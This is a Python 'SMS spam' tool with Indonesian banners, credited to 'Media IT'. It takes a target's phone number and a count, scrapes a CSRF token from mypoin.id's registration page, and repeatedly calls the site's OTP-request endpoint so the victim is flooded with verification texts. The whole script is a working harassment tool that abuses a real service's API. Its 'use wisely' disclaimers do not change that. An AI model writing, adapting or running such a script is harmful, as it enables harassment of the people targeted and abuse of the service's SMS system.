import os, sys, time, requests, json
from requests import post
import subprocess
from bs4 import BeautifulSoup as bs

os.system('clear')

biru = '\33[0;36m'
birub = '\33[1;34m'
merah = '\33[31;1m'
magenta = '\33[1;35m'
hijau = '\33[0;32m'
banner = biru+'''
|________________________________________________|
|  __  ___ ____   ___  __    ___     __   ______ |
| |  \/  | | __] | _ \ | |  / | \    | | |_   _| |
| | |\/| | |__]  ||- / | | /  -  \   | |   | |   |
| |_|  |_| |___] |__/  |_| |_/ \_|   |_|   |_|   |
|________________________________________________|
'''
def typewritter (banner):
	for char in banner:
		sys.stdout.write(char)
		sys.stdout.flush()
		time.sleep(0.01)

banner2 = birub+'''
 [+] SPAM SMS UNLIMTED V2 [MEDIA IT]
 [+] Author	: Media IT
 [+] Youtube	: Media IT
 [+] Github	: https://github.com/ytmediait
 [+] Website	: https://yt-mediait.blogspot.com
 -------------------------------------------------
'''
def typewritter (banner2):
	for char in banner2:
		sys.stdout.write(char)
		sys.stdout.flush()
		time.sleep(0.01)

banner3 = magenta+'''
 # Resiko Ditanggung Pengguna
 # Spamnya Jangan Terlalu Banyak, Kasihan Target
 # Gunakanlah Tools Ini Dengan Bijak
 -----------------------------------------------
'''
def typewritter (banner3):
	for char in banner3:
		sys.stdout.write(char)
		sys.stdout.flush()
		time.sleep(0.01)

typewritter (banner)
typewritter (banner2)
typewritter (banner3)
os.system ('xdg-open https://www.youtube.com/channel/UCoSKB1q90siWxbEVkMoyeMw')

no = input (" Number Phone (08***) : ")
jml = int (input (merah+" Jumlah : "))
print('')

url = 'https://mypoin.id/register/validate-phone-number'
otp = 'https://mypoin.id/register/request-otp'
r  = requests.Session()
ua = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"}
uatp = {"accept": "application/json, text/javascript, */*; q=0.01","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","content-length": "107","content-type": "application/x-www-form-urlencoded; charset=UTF-8","origin": "https://mypoin.id","referer": "https://mypoin.id/register/validate-phone-number","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 ,Safari/537.36","x-requested-with": "XMLHttpRequest"}


for x in range (jml):
	a = r.get(url,headers=ua).text
	b = bs(a,'html.parser')
	c = b.find("input",attrs={"type":"hidden","name":"csrfmiddlewaretoken"})
	e = r.post(otp,headers=uatp,data={"phone":no,"csrfmiddlewaretoken": c["value"]}).text
	time.sleep (20)
	if e == '{"status": "ok"}':
		print (hijau+"Spam SMS SUKSES !!! " +birub+ "[Media IT]")
	else:
		print (merah+"Spam SMS GAGAL " +hijau+ "Coba Mulai Dari Awal Lagi deh...")

print(' -------------------------------------------------')
print ('')
print(merah+' Ingat !!! GUNAKAN TOOLS DENGAN BIJAK')
print(biru+' THANKS YOU')
print ('')
